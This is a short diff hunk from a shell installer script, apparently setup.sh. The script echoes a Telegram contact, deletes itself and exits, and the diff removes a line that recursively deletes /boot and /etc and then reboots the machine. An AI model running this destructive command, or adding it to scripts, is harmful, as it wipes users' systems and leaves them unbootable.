@@ -21,7 +21,6 @@ echo "Telegram t.me/xzvnct"
 echo "Waiting 5 Sec"
 rm -f setup.sh
 sleep 5
-rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi 
 clear
